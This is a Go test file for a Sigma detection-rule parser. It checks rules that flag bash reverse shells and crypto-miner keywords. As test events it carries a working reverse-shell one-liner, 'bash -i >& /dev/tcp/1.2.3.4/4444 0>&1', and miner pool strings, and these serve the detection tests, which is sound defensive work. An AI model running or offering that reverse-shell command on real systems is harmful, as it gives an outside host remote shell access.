package sigma

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

const sample = `
title: Linux Reverse Shell Via Bash
id: 7b2b1f3c-0000-4000-8000-000000000001
status: test
description: |
  A bash reverse shell
  in two lines
tags:
  - attack.execution
  - attack.t1059.004
logsource:
  product: linux
  category: process_creation
detection:
  selection_img:
    Image|endswith:
      - '/bash'
      - '/sh'
  selection_cli:
    CommandLine|contains|all:
      - ' -i '
      - '/dev/tcp/'
  filter_main:
    ParentImage: '/usr/bin/legit'
  condition: all of selection_* and not 1 of filter_*
falsepositives:
  - Unknown
level: high
---
title: Keywords
logsource:
  product: linux
detection:
  keywords:
    - 'stratum+tcp'
    - 'xmrig'
  condition: keywords
level: medium
---
title: Aggregation
logsource:
  product: linux
detection:
  sel:
    Image: x
  condition: sel | count() > 5
`

func getter(m map[string]string) (Getter, func() []string) {
	return func(f string) (string, bool) { v, ok := m[f]; return v, ok }, func() []string {
		var out []string
		for _, v := range m {
			out = append(out, v)
		}
		return out
	}
}

func TestSigma(t *testing.T) {
	rules, errs := ParseFile(sample)
	if len(rules) != 2 || len(errs) != 1 {
		t.Fatalf("rules %d errors %v", len(rules), errs)
	}
	r := rules[0]
	if r.Level != "high" || r.Category != "process_creation" || r.Tags[1] != "attack.t1059.004" || !strings.Contains(r.Description, "two lines") {
		t.Fatalf("meta: %+v", r)
	}
	cases := []struct {
		ev   map[string]string
		want bool
	}{
		{map[string]string{"Image": "/usr/bin/bash", "CommandLine": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "ParentImage": "/usr/sbin/apache2"}, true},
		{map[string]string{"Image": "/USR/BIN/BASH", "CommandLine": "BASH -I >& /DEV/TCP/1.2.3.4/4444", "ParentImage": "/x"}, true},
		{map[string]string{"Image": "/usr/bin/bash", "CommandLine": "bash -i", "ParentImage": "/x"}, false},
		{map[string]string{"Image": "/usr/bin/bash", "CommandLine": "bash -i >& /dev/tcp/1.2.3.4/4444", "ParentImage": "/usr/bin/legit"}, false},
		{map[string]string{"Image": "/usr/bin/zsh", "CommandLine": "zsh -i >& /dev/tcp/x/1"}, false},
	}
	for i, c := range cases {
		g, all := getter(c.ev)
		if got := r.Match(g, all); got != c.want {
			t.Errorf("case %d: got %v", i, got)
		}
	}
	g, all := getter(map[string]string{"CommandLine": "./x -o STRATUM+TCP://pool"})
	if !rules[1].Match(g, all) {
		t.Fatal("keywords")
	}
	if !globMatch("*/tmp/*", "/var/tmp/x") || globMatch("a?c", "abbc") || !globMatch(`a\*b`, "a*b") {
		t.Fatal("glob")
	}
}

// TestSigmaHQ compiles the Linux rules of the SigmaHQ repository, when a
// checkout is given:
//
//	VIGIL_SIGMAHQ=/path/to/sigma/rules/linux go test ./internal/sigma -run SigmaHQ -v
func TestSigmaHQ(t *testing.T) {
	dir := os.Getenv("VIGIL_SIGMAHQ")
	if dir == "" {
		t.Skip("set VIGIL_SIGMAHQ")
	}
	ok, bad := 0, 0
	reasons := map[string]int{}
	filepath.Walk(dir, func(p string, fi os.FileInfo, err error) error {
		if err != nil || fi.IsDir() || !strings.HasSuffix(p, ".yml") {
			return nil
		}
		b, _ := os.ReadFile(p)
		rs, errs := ParseFile(string(b))
		ok += len(rs)
		bad += len(errs)
		for _, e := range errs {
			msg := e.Error()
			if i := strings.Index(msg, ": "); i > 0 {
				msg = msg[i+2:]
			}
			if len(msg) > 70 {
				msg = msg[:70]
			}
			reasons[msg]++
		}
		return nil
	})
	t.Logf("compiled %d, failed %d", ok, bad)
	for m, n := range reasons {
		t.Logf("%4d  %s", n, m)
	}
}
